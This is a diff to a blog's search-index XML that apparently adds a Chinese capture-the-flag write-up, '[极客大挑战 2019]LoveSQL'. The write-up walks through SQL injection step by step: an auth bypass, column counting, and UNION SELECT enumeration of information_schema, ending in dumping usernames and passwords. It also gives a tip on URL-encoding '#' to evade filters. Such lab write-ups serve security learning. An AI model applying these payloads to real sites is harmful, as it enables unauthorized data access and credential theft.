@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>[极客大挑战 2019]LoveSQL</title>
+      <link href="2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/"/>
+      <url>2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="极客大挑战-2019-LoveSQL">          <a href="#极客大挑战-2019-LoveSQL" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]LoveSQL</h1>              <h2 id="1-首先判断是否有注入点">          <a href="#1-首先判断是否有注入点" class="heading-link"><i class="fas fa-link"></i></a>1.首先判断是否有注入点</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br><span class="line">111</span><br></pre></td></tr></table></div></figure><a id="more"></a><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/1.1.png"></p><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/1.2.png"></p>        <h2 id="2-判断字段个数">          <a href="#2-判断字段个数" class="heading-link"><i class="fas fa-link"></i></a>2.判断字段个数</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; order by 3%23&amp;password&#x3D;111</span><br><span class="line">?username&#x3D;1&#39; order by 4%23&amp;password&#x3D;111</span><br><span class="line">当by 4的时候报错显示字段长度不对，所以有3个字段</span><br><span class="line">%23是#通过url编码后的，有的地方设置了界限，比如说遇到#这个字符就会报错或者转换成别的，我们用url编码的目的就是用相同的意思而不被发现从而绕过规定的限制。</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/2.1.jpg"></p><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/2.2.png"></p>        <h2 id="3-查找数据库">          <a href="#3-查找数据库" class="heading-link"><i class="fas fa-link"></i></a>3.查找数据库</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(schema_name)from information_schema.schemata%23&amp;password&#x3D;111</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/3.1.png"></p><p>可以看出有不止一个数据库，其实真正有效的只有test和geek，，其他的一般有经验的都知道那是服务器自带的</p>        <h2 id="4-查找数据表">          <a href="#4-查找数据表" class="heading-link"><i class="fas fa-link"></i></a>4.查找数据表</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;geek&#39;%23&amp;password&#x3D;111</span><br><span class="line">或者下面的，因为它有两个数据库</span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;test&#39;%23&amp;password&#x3D;111</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/4.1.png"></p><p>有两个数据库 geek和test，所以我们都要试一下，可以看到在geek中有两个数据表</p>        <h2 id="5-查看数据结构">          <a href="#5-查看数据结构" class="heading-link"><i class="fas fa-link"></i></a>5.查看数据结构</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;geekuser&#39;%23&amp;password&#x3D;11</span><br><span class="line">或者</span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;%23&amp;password&#x3D;111</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/5.1.png"></p><p>l0ve1ysq1才有有效的东西</p>        <h2 id="6-查看数据结构里内容">          <a href="#6-查看数据结构里内容" class="heading-link"><i class="fas fa-link"></i></a>6.查看数据结构里内容</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(id,username,password)from l0ve1ysq1%23&amp;password&#x3D;111</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/6.1.png"></p><p>F12查看网页源代码</p><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/6.2.png"></p><p>flag 到手</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL注入的入门</title>
       <link href="2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/"/>
       <url>2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/</url>
@@ -13,14 +38,14 @@
       
       <categories>
           
-          <category> Web </category>
+          <category> Web渗透 </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> XSS </tag>
+            <tag> SQL </tag>
             
         </tags>
       
